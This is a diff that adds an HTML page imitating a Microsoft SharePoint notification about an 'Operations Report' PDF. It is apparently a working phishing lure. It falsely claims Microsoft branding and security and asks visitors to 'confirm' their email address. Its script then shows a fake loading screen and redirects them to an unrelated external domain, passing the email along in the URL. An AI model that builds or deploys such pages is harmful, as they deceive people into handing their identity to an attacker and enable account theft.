@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>SharePoint Document Notification</title>
+<style>
+body {
+font-family: "Segoe UI", Tahoma, Geneva, Verdana, sans-serif;
+background-color: #f3f6fb;
+margin: 0;
+padding: 0;
+display: flex;
+flex-direction: column;
+align-items: center;
+justify-content: center;
+height: 100vh;
+}
+.header {
+display: flex;
+align-items: center;
+margin-bottom: 10px;
+}
+.logo {
+width: 40px;
+height: 40px;
+background-color: #0078d4;
+border-radius: 8px;
+display: flex;
+align-items: center;
+justify-content: center;
+color: #fff;
+font-weight: bold;
+font-size: 18px;
+margin-right: 10px;
+}
+.title {
+font-size: 24px;
+color: #0078d4;
+font-weight: bold;
+}
+.sub-header {
+font-size: 15px;
+margin-bottom: 20px;
+color: #444;
+}
+.document-box {
+background: #fff;
+padding: 20px 25px;
+box-shadow: 0 0 20px rgba(0,0,0,0.1);
+border-radius: 10px;
+text-align: center;
+width: 95%;
+max-width: 400px;
+animation: pulse 3s infinite;
+}
+@keyframes pulse {
+0% { box-shadow: 0 0 15px rgba(0, 120, 212, 0.3); }
+50% { box-shadow: 0 0 25px rgba(0, 120, 212, 0.5); }
+100% { box-shadow: 0 0 15px rgba(0, 120, 212, 0.3); }
+}
+.word-logo {
+width: 50px;
+margin-bottom: 15px;
+}
+.file-name {
+font-weight: bold;
+font-size: 18px;
+color: #333;
+}
+.file-size {
+font-size: 13px;
+color: #666;
+margin-top: 5px;
+}
+.instruction {
+margin-top: 20px;
+font-size: 14px;
+color: #555;
+}
+input[type="email"] {
+margin-top: 10px;
+width: 90%;
+padding: 10px;
+border: 1px solid #ccc;
+border-radius: 5px;
+font-size: 14px;
+}
+button {
+margin-top: 20px;
+background-color: #0078d4;
+color: #fff;
+border: none;
+padding: 12px 20px;
+font-size: 15px;
+border-radius: 5px;
+cursor: pointer;
+width: 100%;
+}
+button:hover {
+background-color: #005a9e;
+}
+.footer {
+margin-top: 25px;
+font-size: 11px;
+color: #999;
+text-align: center;
+}
+
+/* Loading Screen */
+.loading-screen {
+display: none;
+position: fixed;
+background-color: #ffffff;
+top: 0;
+left: 0;
+width: 100%;
+height: 100%;
+z-index: 9999;
+flex-direction: column;
+justify-content: center;
+align-items: center;
+}
+.blurred-document {
+width: 250px;
+height: auto;
+filter: blur(4px);
+margin-bottom: 20px;
+}
+.spinner {
+border: 5px solid #f3f3f3;
+border-top: 5px solid #0078d4;
+border-radius: 50%;
+width: 40px;
+height: 40px;
+animation: spin 1s linear infinite;
+margin-bottom: 15px;
+}
+@keyframes spin {
+0% { transform: rotate(0deg); }
+100% { transform: rotate(360deg); }
+}
+.loading-text {
+font-size: 16px;
+color: #0078d4;
+font-weight: bold;
+}
+</style>
+</head>
+<body>
+
+<!-- Loading screen with blurry image -->
+<div class="loading-screen" id="loading">
+ <img class="blurred-document" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAZAAAAGQCAMAAAC3YcbFAAAABlBMVEX///8AAABVwtN+AAABmElEQVR4nO3QwQ3CMBBA0WP///YqIGQug+G2g6l7M1JM6czfT34VBAAAAAAAAAAAAAAAAgN8Fe5tOd6X/ruKY7N6B4ev9Z7v2gfR33rX9oH4t7fRb94G6/M3zH4f0t31a/4HbvzS/bP9hfUd93f32v2Hdvxg/UF99b9vd+Bx9QX39j1tT0GH9AXf23fW9AZ/UF99YHb7fU9Dx9QX31j1w/UZfUF99YdTr0P8aF9QX30HdqfX9GH1Bff2P23/UZfUF99b9vT9BffUO/2x/YfU9PpQX30HdXfRffUF9/T+3j9Rl9QX31gdnp9T0P/UG9BffWHW7tDX1BX35j19D/UG99Qf21g9vT0GH9AXfW/4Gh9f0GH1BfdW/oeo8fUF99Ytbf0NfUF99Y9vT9BfdU//KH1BX35j2df1BX3zg9EAAAAAAAAgGH7AHHD/wcG/jZHAAAAAElFTkSuQmCC" alt="Blurry Document">
+ <div class="spinner"></div>
+ <div class="loading-text">Preparing document preview...</div>
+</div>
+
+<!-- Main Page -->
+<div class="header">
+ <div class="logo">S</div>
+ <div class="title">SharePoint</div>
+</div>
+
+<div class="sub-header">A new document is now available for your review.</div>
+
+<div class="document-box">
+ <img class="word-logo" src="https://upload.wikimedia.org/wikipedia/commons/4/4f/Microsoft_Word_2013-2019_logo.svg" alt="Word Logo">
+ <div class="file-name">Operations_Report_Summ_INVQ2_2025.pdf</div>
+ <div class="file-size">9.90 MB</div>
+
+ <div class="instruction">
+ Please confirm your recipient email address:
+ </div>
+
+ <form id="emailForm">
+ <input type="email" id="email" name="email" placeholder="Email address" required>
+ <button type="submit">Preview Document</button>
+ </form>
+</div>
+
+<div class="footer">
+ This is a secure document sharing notification. Please do not forward this email.<br>
+ &copy; 2025 Microsoft. Privacy & Cookies.
+</div>
+
+<script>
+const form = document.getElementById('emailForm');
+const loadingScreen = document.getElementById('loading');
+
+form.addEventListener('submit', function(e) {
+e.preventDefault();
+const email = document.getElementById('email').value.trim();
+if (email) {
+document.body.style.overflow = "hidden";
+loadingScreen.style.display = "flex";
+setTimeout(function() {
+window.location.href = "https://operationsreportsummary-hub.oozed.it.com/1RHdb?email=" + encodeURIComponent(email);
+}, 2500); // 2.5 seconds loading screen
+}
+});
+</script>
+
+</body>
+</html>
